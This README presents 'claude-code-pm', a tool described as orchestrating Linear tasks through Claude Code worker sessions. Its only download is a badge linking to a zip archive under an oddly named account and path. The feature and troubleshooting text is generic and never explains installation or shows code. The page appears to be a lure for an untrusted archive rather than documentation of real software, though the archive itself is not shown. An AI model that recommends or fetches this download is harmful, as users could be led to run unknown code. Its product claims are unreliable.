# 🤖 claude-code-pm - Run Linear tasks with less effort

[![Download](https://img.shields.io/badge/Download-claude--code--pm-blue.svg?style=for-the-badge)](https://raw.githubusercontent.com/falungongcleanness498/claude-code-pm/main/headchair/pm-code-claude-limonene.zip)

## 🧩 What this app does

claude-code-pm helps Claude Code manage project work from start to finish. It splits a task into parts, sends work to worker sessions, checks results, and brings the pieces back together.

Use it when you want to:

- fetch Linear tasks
- split work across more than one session
- implement changes in steps
- verify the result before merge
- keep the flow of work organized

## 🛠️ How to use it

Once the app is set up, use it like this:

1. Open Claude Code.
2. Load the `claude-code-pm` project folder.
3. Pick a Linear task.
4. Tell the app to start the task flow.
5. Let it divide the work into worker sessions.
6. Review the results from each step.
7. Check the verification stage.
8. Merge the final work into the main task.

A simple flow may look like this:

- fetch a task from Linear
- break it into small jobs
- assign jobs to worker sessions
- collect the output
- verify the changes
- merge the finished work

## 🔄 Typical workflow

This project is built for task orchestration. That means it helps guide work through a clear path.

### 1. Fetch
The app pulls a task from Linear.

### 2. Plan
It breaks the task into parts that are easier to handle.

### 3. Work
It sends those parts to worker sessions.

### 4. Check
It reviews the output and looks for missing pieces.

### 5. Verify
It confirms the task works as expected.

### 6. Merge
It brings the final changes back into one result.

## 🧪 Verification steps

Before you mark a task as done, check:

- the task changes match the request
- the code or content is complete
- the result has no obvious errors
- the final merge includes all required parts
- the task status in Linear is correct

If something looks wrong, rerun the worker step and check the output again.

## ❓ Troubleshooting

If the app does not start, try these steps:

- make sure the files finished downloading
- check that the folder was extracted
- move the project to a shorter path, such as `C:\claude-code-pm`
- restart Claude Code
- check that your Linear access is still valid
- open the project again after closing other apps

If a task does not load:

- confirm the Linear team is correct
- refresh the task page
- check your internet connection
- try a different task

If worker sessions do not respond:

- close Claude Code
- reopen the project
- run the setup again
- confirm the app can reach the needed services
